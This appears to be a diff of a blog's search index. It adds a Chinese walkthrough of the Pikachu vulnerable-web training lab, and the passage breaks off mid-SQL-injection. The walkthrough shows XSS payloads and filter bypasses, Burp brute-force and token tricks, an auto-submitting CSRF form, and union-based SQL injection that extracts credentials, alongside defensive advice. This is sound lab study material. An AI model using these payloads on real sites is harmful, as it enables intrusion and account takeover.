-<p> 1、盲打其实只是一种习惯性的说法，就是在不知道后台有没有xss存在的情况下，不顾一切的输入xss代码在留言处，这个留言不在用户前端显示，而是在管理员页面显示。</p>
-<p> 2、xss盲打是指在攻击者对数据提交后展现的后台未知情况下，网站采用了攻击者插入带真实攻击功能的xss攻击代码（通常是使用js标签引入远程的js）。当未知后台在展现时没有对这些提交的额数据进行过滤，那么后台管理人员在操作时就会触发xss攻击。</p>
-</blockquote>
-<p>随便输入一点东西进去试试！发现前端没有任何的显示</p>
-<p><img src="/2022/04/17/pikachu/23.png" alt> </p>
-<p>看提示说后台已经收到了我们提交的内容了，登录后台看一下</p>
-<p><img src="/2022/04/17/pikachu/24.png" alt></p>
-<p>可以看到我们成功的提交信息到了后台，因此在前端构造<code>js</code>语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-<p><img src="/2022/04/17/pikachu/25.png" alt></p>
-<p>提交后再次登录后台，即可发现攻击成功</p>
-<p><img src="/2022/04/17/pikachu/26.png" alt></p>
-<h2 id="8、xss之过滤"><a href="#8、xss之过滤" class="headerlink" title="8、xss之过滤"></a>8、xss之过滤</h2><p>随便输入点东西试试！发现他会重复你输入的内容并显示在前端</p>
-<p><img src="/2022/04/17/pikachu/27.png" alt></p>
-<p>但当我们构造<code>js</code>语句试图攻击时，发现我们的语句被过滤了</p>
-<p><img src="/2022/04/17/pikachu/28.png" alt></p>
-<blockquote>
-<p>那么我们就要通过各种绕过的姿势将其绕过</p>
-<p>我写过相应的文章，可以参考一下：<a href="https://www.cgrona.top/2022/03/19/xss/">XSS各种绕过姿势</a></p>
-</blockquote>
-<p>在这里就简单说几个常见的绕过</p>
-<ol>
-<li><p>大小写绕过</p>
-<p><code>&lt;SCRIPT&gt;aLeRT(1)&lt;/sCRIpt&gt;</code></p>
-</li>
-<li><p>双写关键字绕过</p>
-<p><code>&lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;&gt;pt&gt;</code></p>
-</li>
-<li><p>各种编码绕过</p>
-</li>
-</ol>
-<p>如果不想绕过的话，我们也可以换一种<code>js</code>的写法：<code>&lt;a onclick=&quot;alert(1)&quot;&gt;</code></p>
-<p>可以看到这种写法并没有被过滤，成功将<code>js</code>写入</p>
-<p><img src="/2022/04/17/pikachu/29.png" alt></p>
-<p>我们只需要点击这个链接即可触发xss</p>
-<p><img src="/2022/04/17/pikachu/30.png" alt></p>
-<h2 id="9、xss之htmlspecialchars"><a href="#9、xss之htmlspecialchars" class="headerlink" title="9、xss之htmlspecialchars"></a>9、xss之htmlspecialchars</h2><blockquote>
-<p>关于htmlspecialchars()函数</p>
-<p>该函数是把预定义的字符转换为html实体</p>
-<p>预定义的字符是：</p>
-<ol>
-<li><code>&amp;</code>（和号）转换为<code>&amp;amp</code></li>
-<li><code>&quot;</code>（双引号）转换为<code>&amp;quot</code></li>
-<li><code>&#39;</code>（单引号）转换为<code>&amp;#039</code></li>
-<li><code>&lt;</code>（小于号）转换为<code>&amp;lt</code></li>
-<li><code>&gt;</code>（大于号）转换为<code>&amp;gt</code></li>
-</ol>
-</blockquote>
-<p>把这些符号随便输入一些进去</p>
-<p><img src="/2022/04/17/pikachu/31.png" alt></p>
-<p>打开控制台，可以看到除了&amp;和单引号，其余的符号都被过滤了</p>
-<p><img src="/2022/04/17/pikachu/32.png" alt></p>
-<p>所以构造payload：<code>&#39; onclick=&#39;alert(1)&#39;</code>，提交后查看源码</p>
-<p><img src="/2022/04/17/pikachu/33.png" alt></p>
-<p>点击链接，发现成功弹窗</p>
-<p><img src="/2022/04/17/pikachu/34.png" alt></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -2114,6 +1932,279 @@
       </categories>
       <tags>
         <tag>read</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pikachu</title>
+    <url>/2022/04/17/pikachu/</url>
+    <content><![CDATA[<h1 id="一、搭建靶场"><a href="#一、搭建靶场" class="headerlink" title="一、搭建靶场"></a>一、搭建靶场</h1><ol>
+<li>去官网把靶场下载下来，<a href="https://github.com/zhuifengshaonianhanlu/pikachu">链接地址</a></li>
+<li>将下载好的<code>pikachu</code>文件夹到<code>phpstudy</code>的<code>www</code>目录下</li>
+<li>到<code>pikachu/inc/config.inc.php</code>中更改数据库连接的账号和密码</li>
+<li>访问<code>localhost/pikachu/index.php</code>进行初始化安装</li>
+<li>安装完成后即可访问开干</li>
+</ol>
+<h1 id="二、暴力破解"><a href="#二、暴力破解" class="headerlink" title="二、暴力破解"></a>二、暴力破解</h1><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p><strong>Burte Force（暴力破解）概述</strong></p>
+<p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。            其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。        </p>
+<p>  理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：</p>
+<ol>
+<li>是否要求用户设置复杂的密码</li>
+<li>是否每次认证都是用安全的验证码或者手机otp</li>
+<li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）</li>
+<li>是否采用了双因素认证</li>
+<li>…</li>
+</ol>
+<h2 id="2、基于表单的暴力破解"><a href="#2、基于表单的暴力破解" class="headerlink" title="2、基于表单的暴力破解"></a>2、基于表单的暴力破解</h2><p>一个简单的登陆界面，既没有验证码也没有对登陆的行为进行限制</p>
+<p><img src="/2022/04/17/pikachu/1.png" alt></p>
+<p>直接扔Burp里爆破即可</p>
+<p><img src="/2022/04/17/pikachu/2.png" alt></p>
+<h2 id="3、验证码绕过（on-server）"><a href="#3、验证码绕过（on-server）" class="headerlink" title="3、验证码绕过（on server）"></a>3、验证码绕过（on server）</h2><p>burp抓包，放入<code>repeater</code>里<code>go</code>一下，发现并没有报验证码错误</p>
+<p><img src="/2022/04/17/pikachu/3.png" alt></p>
+<p>这时我们再<code>go</code>一下，发现还是只报账号密码的错误，并没有报验证码的错误，因此只要我们不刷新页面，该验证码就可以被无限使用</p>
+<p><img src="/2022/04/17/pikachu/4.png" alt></p>
+<p>那就直接放burp爆破即可</p>
+<p><img src="/2022/04/17/pikachu/5.png" alt></p>
+<h2 id="4、验证码绕过（on-client）"><a href="#4、验证码绕过（on-client）" class="headerlink" title="4、验证码绕过（on client）"></a>4、验证码绕过（on client）</h2><p>burp抓包后放入<code>repeater</code>里，发现和上一关一样，并不会报验证码的错误，因此继续直接扔<code>intruder</code>里爆破即可</p>
+<p><img src="/2022/04/17/pikachu/6.png" alt></p>
+<p>但这里其实是有一个<code>js</code>用来生成验证码</p>
+<p><img src="/2022/04/17/pikachu/7.png" alt></p>
+<p>所以我们只需要将<code>js</code>移除即可</p>
+<ol>
+<li><p>在浏览器控制台将<code>js</code>禁用</p>
+<p><img src="/2022/04/17/pikachu/8.png" alt></p>
+</li>
+<li><p>在burp代理<code>proxy</code>模块的设置里，<code>Response Modification</code>中勾选<code>Remove all Javascript</code>选项，将所有<code>js</code>移除</p>
+</li>
+</ol>
+<p>将<code>js</code>关闭后，刷新页面即可发现验证码没有了</p>
+<p><img src="/2022/04/17/pikachu/9.png" alt></p>
+<p>然后再进行爆破即可</p>
+<h2 id="5、token验证"><a href="#5、token验证" class="headerlink" title="5、token验证"></a>5、token验证</h2><p>burp抓包发现有个<code>token</code>值</p>
+<blockquote>
+<p>Token介绍</p>
+<p>1、当前端向服务器端请求认证并成功后，服务器端将会返回一个Token值给前端作为合法身份的令牌</p>
+<p>2、Token可以避免CSRF攻击</p>
+</blockquote>
+<p>分析一下前端的代码可以发现，存在一个隐藏的标签，里面记录了服务端返回的<code>token</code>值，并且和我们抓到的数据的包的<code>token</code>值不一样，因此我们可以推测我们每请求一次服务端，服务端就会返回一个不同的<code>token</code>值来验证我们的身份</p>
+<p><img src="/2022/04/17/pikachu/10.png" alt></p>
+<blockquote>
+<p>解决思路很简单，因为当我们发送请求给服务端之后，服务端就已经给了我们一个新的<code>token</code>值，因此我们需要将这个<code>token</code>值获取出来并在我们的下一次爆破做为身份令牌</p>
+</blockquote>
+<ol>
+<li><p>抓包后放入<code>intruder</code>模块，并将攻击类型（attack type）改为<code>Pitchfork</code>（对每个标记的字段分配不同的字典）</p>
+</li>
+<li><p>接下来设置<code>Payloads</code></p>
+<p>对第一个字段，也就是password字段，设置一个字典</p>
+<p><img src="/2022/04/17/pikachu/11.png" alt></p>
+</li>
+<li><p>然后将<code>Payload set</code>改为2，设置第二个字段，将<code>Payload type</code>改为<code>Recursive grep</code>（递归查找)，然后在<code>options</code>设置里找到<code>Grep - Extract</code>模块，点击<code>Add</code></p>
+<p><img src="/2022/04/17/pikachu/12.png" alt></p>
+</li>
+<li><p>在弹出来的窗口中点击<code>Fetch response</code>，然后找到<code>token</code>的位置，将<code>value</code>值选中并复制（待会有用），然后点OK即可</p>
+<p><img src="/2022/04/17/pikachu/13.png" alt></p>
+</li>
+<li><p>将页面拉到最下面，找到<code>Redirections</code>模块，将<code>Always</code>选上</p>
+<p><img src="/2022/04/17/pikachu/14.png" alt></p>
+</li>
+<li><p>回到<code>Payloads</code>，在<code>Initial payload for first request</code>的值那粘贴刚刚复制的<code>token</code>值</p>
+<p><img src="/2022/04/17/pikachu/15.png" alt></p>
+</li>
+<li><p>最后将线程改为1就可以开始攻击了</p>
+<p><img src="/2022/04/17/pikachu/16.png" alt></p>
+</li>
+</ol>
+<p>结果如下</p>
+<p><img src="/2022/04/17/pikachu/17.png" alt></p>
+<h1 id="三、XSS（跨站脚本漏洞）"><a href="#三、XSS（跨站脚本漏洞）" class="headerlink" title="三、XSS（跨站脚本漏洞）"></a>三、XSS（跨站脚本漏洞）</h1><h2 id="1、概述-1"><a href="#1、概述-1" class="headerlink" title="1、概述"></a>1、概述</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p>
+<ol>
+<li><p>反射型XSS</p>
+<p>交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面</p>
+</li>
+<li><p>存储型XSS</p>
+<p>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面</p>
+</li>
+<li><p>DOM型XSS</p>
+<p>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性也属于反射性</p>
+</li>
+</ol>
+<ul>
+<li>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</li>
+<li>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。 </li>
+<li>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</li>
+<li>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理：<ol>
+<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入</li>
+<li>输出转义：根据输出点的位置对输出到前端的内容进行适当转义</li>
+</ol>
+</li>
+</ul>
+<h2 id="2、反射型xss（get）"><a href="#2、反射型xss（get）" class="headerlink" title="2、反射型xss（get）"></a>2、反射型xss（get）</h2><p>将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>写入，发现有长度限制，但这只是前端的限制，我们只需要在URL上进行修改即可</p>
+<p><img src="/2022/04/17/pikachu/18.png" alt></p>
+<p><img src="/2022/04/17/pikachu/19.png" alt></p>
+<p>攻击成功</p>
+<h2 id="3、反射型xss（post）"><a href="#3、反射型xss（post）" class="headerlink" title="3、反射型xss（post）"></a>3、反射型xss（post）</h2><p>用admin/123456登陆进去后，按照上一关的payload即可成功</p>
+<h2 id="4、存储型xss"><a href="#4、存储型xss" class="headerlink" title="4、存储型xss"></a>4、存储型xss</h2><p>同样将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>输入，然后每次进入这个页面就会执行一次这个<code>js</code>，这就是存储型，因为存储型xss是保存在数据库里的，如果用户刷新，留言列表会从数据库提取出xss数据弹框</p>
+<h2 id="5、DOM型xss"><a href="#5、DOM型xss" class="headerlink" title="5、DOM型xss"></a>5、DOM型xss</h2><p>将之前的payload输入进去后发现并没有用，F12打开控制台，发现我们填入的内容被引号给转义了</p>
+<p><img src="/2022/04/17/pikachu/20.png" alt></p>
+<p>因此我们要在前面加一个单引号将其闭合，构造payload：<code>&#39;onclick=&quot;alert(1)&gt;&quot;</code>，点击出现的链接即可触发</p>
+<p><img src="/2022/04/17/pikachu/21.png" alt></p>
+<h2 id="6、DOM型xss-x"><a href="#6、DOM型xss-x" class="headerlink" title="6、DOM型xss-x"></a>6、DOM型xss-x</h2><p>这题和上一题是一样的道理</p>
+<p>payload：<code>&#39;onclick=&quot;alert(1)&quot;&gt;</code></p>
+<p><img src="/2022/04/17/pikachu/22.png" alt></p>
+<h2 id="7、xss之盲打"><a href="#7、xss之盲打" class="headerlink" title="7、xss之盲打"></a>7、xss之盲打</h2><blockquote>
+<p><strong>概念</strong></p>
+<p> 1、盲打其实只是一种习惯性的说法，就是在不知道后台有没有xss存在的情况下，不顾一切的输入xss代码在留言处，这个留言不在用户前端显示，而是在管理员页面显示。</p>
+<p> 2、xss盲打是指在攻击者对数据提交后展现的后台未知情况下，网站采用了攻击者插入带真实攻击功能的xss攻击代码（通常是使用js标签引入远程的js）。当未知后台在展现时没有对这些提交的额数据进行过滤，那么后台管理人员在操作时就会触发xss攻击。</p>
+</blockquote>
+<p>随便输入一点东西进去试试！发现前端没有任何的显示</p>
+<p><img src="/2022/04/17/pikachu/23.png" alt> </p>
+<p>看提示说后台已经收到了我们提交的内容了，登录后台看一下</p>
+<p><img src="/2022/04/17/pikachu/24.png" alt></p>
+<p>可以看到我们成功的提交信息到了后台，因此在前端构造<code>js</code>语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="/2022/04/17/pikachu/25.png" alt></p>
+<p>提交后再次登录后台，即可发现攻击成功</p>
+<p><img src="/2022/04/17/pikachu/26.png" alt></p>
+<h2 id="8、xss之过滤"><a href="#8、xss之过滤" class="headerlink" title="8、xss之过滤"></a>8、xss之过滤</h2><p>随便输入点东西试试！发现他会重复你输入的内容并显示在前端</p>
+<p><img src="/2022/04/17/pikachu/27.png" alt></p>
+<p>但当我们构造<code>js</code>语句试图攻击时，发现我们的语句被过滤了</p>
+<p><img src="/2022/04/17/pikachu/28.png" alt></p>
+<blockquote>
+<p>那么我们就要通过各种绕过的姿势将其绕过</p>
+<p>我写过相应的文章，可以参考一下：<a href="https://www.cgrona.top/2022/03/19/xss/">XSS各种绕过姿势</a></p>
+</blockquote>
+<p>在这里就简单说几个常见的绕过</p>
+<ol>
+<li><p>大小写绕过</p>
+<p><code>&lt;SCRIPT&gt;aLeRT(1)&lt;/sCRIpt&gt;</code></p>
+</li>
+<li><p>双写关键字绕过</p>
+<p><code>&lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;&gt;pt&gt;</code></p>
+</li>
+<li><p>各种编码绕过</p>
+</li>
+</ol>
+<p>如果不想绕过的话，我们也可以换一种<code>js</code>的写法：<code>&lt;a onclick=&quot;alert(1)&quot;&gt;</code></p>
+<p>可以看到这种写法并没有被过滤，成功将<code>js</code>写入</p>
+<p><img src="/2022/04/17/pikachu/29.png" alt></p>
+<p>我们只需要点击这个链接即可触发xss</p>
+<p><img src="/2022/04/17/pikachu/30.png" alt></p>
+<h2 id="9、xss之htmlspecialchars"><a href="#9、xss之htmlspecialchars" class="headerlink" title="9、xss之htmlspecialchars"></a>9、xss之htmlspecialchars</h2><blockquote>
+<p>关于htmlspecialchars()函数</p>
+<p>该函数是把预定义的字符转换为html实体</p>
+<p>预定义的字符是：</p>
+<ol>
+<li><code>&amp;</code>（和号）转换为<code>&amp;amp</code></li>
+<li><code>&quot;</code>（双引号）转换为<code>&amp;quot</code></li>
+<li><code>&#39;</code>（单引号）转换为<code>&amp;#039</code></li>
+<li><code>&lt;</code>（小于号）转换为<code>&amp;lt</code></li>
+<li><code>&gt;</code>（大于号）转换为<code>&amp;gt</code></li>
+</ol>
+</blockquote>
+<p>把这些符号随便输入一些进去</p>
+<p><img src="/2022/04/17/pikachu/31.png" alt></p>
+<p>打开控制台，可以看到除了&amp;和单引号，其余的符号都被过滤了</p>
+<p><img src="/2022/04/17/pikachu/32.png" alt></p>
+<p>所以构造payload：<code>&#39; onclick=&#39;alert(1)&#39;</code>，提交后查看源码</p>
+<p><img src="/2022/04/17/pikachu/33.png" alt></p>
+<p>点击链接，发现成功弹窗</p>
+<p><img src="/2022/04/17/pikachu/34.png" alt></p>
+<h2 id="10、xss之href输出"><a href="#10、xss之href输出" class="headerlink" title="10、xss之href输出"></a>10、xss之href输出</h2><p>这里把<code>&#39;</code> <code>&quot;</code> <code>&lt;</code> <code>&gt;</code>四个全部过滤掉了，但是可以用<code>javascript:</code>伪协议绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/pikachu/35.png" alt></p>
+<p>成功弹窗</p>
+<p>防御措施：</p>
+<ol>
+<li>输入的时候只允许 http 或 https 开头的协议，才允许输出</li>
+<li>输入的内容再进行 htmlspecialchars 处理</li>
+</ol>
+<h2 id="11、xss之js输出"><a href="#11、xss之js输出" class="headerlink" title="11、xss之js输出"></a>11、xss之js输出</h2><p>随便输入内容，然后回显出一句话，根据这句话我们就能找到这个 js 的源码的位置</p>
+<p><img src="/2022/04/17/pikachu/36.png" alt></p>
+<p>根据这个 js 的内容进行构造xss语句即可，payload：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/1/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/pikachu/37.png" alt></p>
+<p>成功弹窗</p>
+<h2 id="12、xss常见防范措施"><a href="#12、xss常见防范措施" class="headerlink" title="12、xss常见防范措施"></a>12、xss常见防范措施</h2><ol>
+<li>总的原则：输入做过滤；输出做转义</li>
+<li>过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。</li>
+<li>转义：所有输出到前端的数据都根据输出点进行转义，比如输出到html中进行html实体转义，输入到 js 里面的进行 js 转义。</li>
+</ol>
+<h1 id="四、CSRF"><a href="#四、CSRF" class="headerlink" title="四、CSRF"></a>四、CSRF</h1><h2 id="1、概述-2"><a href="#1、概述-2" class="headerlink" title="1、概述"></a>1、概述</h2><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>这里列举一个场景解释一下，希望能够帮助你理解。<br><strong>场景需求：</strong><br>小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。<br><strong>先看下大白是如何修改自己的密码的：</strong><br>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。<br>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：<a href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change</a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。<br><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong></p>
+<ol>
+<li>www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。</li>
+<li>小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做：欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<ul>
+<li>对敏感信息的操作增加安全的token；</li>
+<li>对敏感信息的操作增加安全的验证码；</li>
+<li>对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</li>
+</ul>
+</li>
+</ol>
+<h2 id="2、CSRF-get"><a href="#2、CSRF-get" class="headerlink" title="2、CSRF(get)"></a>2、CSRF(get)</h2><p>先利用提示给的其中一个用户名进行登录</p>
+<p><img src="/2022/04/17/pikachu/38.png" alt></p>
+<p>登录后抓包查看数据，发现数据都是在url上进行修改</p>
+<p><img src="/2022/04/17/pikachu/39.png" alt></p>
+<p>将数据进行修改</p>
+<p><img src="/2022/04/17/pikachu/40.png" alt></p>
+<p>修改完成后打开一个新页面然后访问这个url即可完成数据修改</p>
+<p><img src="/2022/04/17/pikachu/41.png" alt></p>
+<p>同时原页面在刷新后，数据也发生了改变</p>
+<h2 id="3、CSRF-post"><a href="#3、CSRF-post" class="headerlink" title="3、CSRF(post)"></a>3、CSRF(post)</h2><p>这里的所以参数数据都是以POST的方式进行提交，简单的构造url行不通，那就可以通过伪造网站进行攻击</p>
+<p>==攻击者先搭建一个站点，在这个站点上做一些表单提交，诱导受害者点击链接，当受害者点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息==</p>
+<p>代码如下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://1.12.47.102:8001/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;body&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456789&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;vince@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将该页面放入www服务下，诱导受害者去点击即可</p>
+<h2 id="4、CSRF-Token"><a href="#4、CSRF-Token" class="headerlink" title="4、CSRF Token"></a>4、CSRF Token</h2><p>这是一个很好的防范CSRF的措施，每次请求和响应都增加一个Token（随机码），每次的请求都要经过Token验证，很好的防范了CSRF</p>
+<h2 id="5、常见CSRF防范措施"><a href="#5、常见CSRF防范措施" class="headerlink" title="5、常见CSRF防范措施"></a>5、常见CSRF防范措施</h2><ol>
+<li>增加Token验证</li>
+<li>不要在客户端保存敏感信息（如身份认证信息）</li>
+<li>设置会话过期机制，如10分钟内无操作则自动退出</li>
+<li>敏感信息的修改需要对身份进行二次认证，比如修改密码时要对旧密码进行验证</li>
+<li>敏感信息的修改要使用POST而不用GET</li>
+<li>通过http头部的referer来限制原页面</li>
+</ol>
+<h1 id="五、SQL-Inject"><a href="#五、SQL-Inject" class="headerlink" title="五、SQL-Inject"></a>五、SQL-Inject</h1><h2 id="1、概述-3"><a href="#1、概述-3" class="headerlink" title="1、概述"></a>1、概述</h2><p><em>哦，SQL注入漏洞，可怕的漏洞。</em><br>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br><strong>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</strong><br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。<br>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：</p>
+<ol>
+<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
+<li>使用参数化（Parameterized Query 或 Parameterized Statement）；</li>
+<li>还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!<br>SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。</li>
+</ol>
+<h2 id="2、数字型注入-post"><a href="#2、数字型注入-post" class="headerlink" title="2、数字型注入(post)"></a>2、数字型注入(post)</h2><p>抓包，构造SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>	# 报错<span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>	# 正常回显，爆字段列数为<span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="keyword">user</span>()	# 得到回显hello,pikachu <span class="operator">&lt;</span>br <span class="operator">/</span><span class="operator">&gt;</span>your email <span class="keyword">is</span>: root<span class="variable">@localhost</span>，即爆出数据库名为pikachu和数据库用户为root<span class="variable">@localhost</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()	# 爆数据表</span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>	# 爆字段</span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span 